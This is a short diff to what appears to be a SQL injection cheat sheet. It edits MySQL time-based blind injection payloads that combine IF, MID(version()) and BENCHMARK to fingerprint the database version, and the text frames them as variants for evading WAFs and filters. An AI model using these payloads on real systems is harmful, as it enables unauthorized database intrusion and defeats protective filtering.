@@ -100,8 +100,8 @@ Time-based blind injection uses conditional logic with time delays:
 Combine conditional logic with BENCHMARK for version-based timing attacks. Multiple variations shown for WAF/filter evasion - use whichever functions aren't blocked:
 
 ```sql
--- Using MID() + version() + LIKE (alternative to SUBSTRING/@@version/=)
-IF(MID(version(),1,1) LIKE '5', BENCHMARK(100000,SHA1('true')), false)
+-- Using MID() + version() + equality check (alternative to SUBSTRING/@@version)
+IF(MID(version(),1,1) = '5', BENCHMARK(100000,SHA1('true')), false)
 
 -- Using MID() + equality check for specific version (5.7)
 IF(MID(version(),1,3)='5.7', BENCHMARK(100000,SHA1(1)), 0)
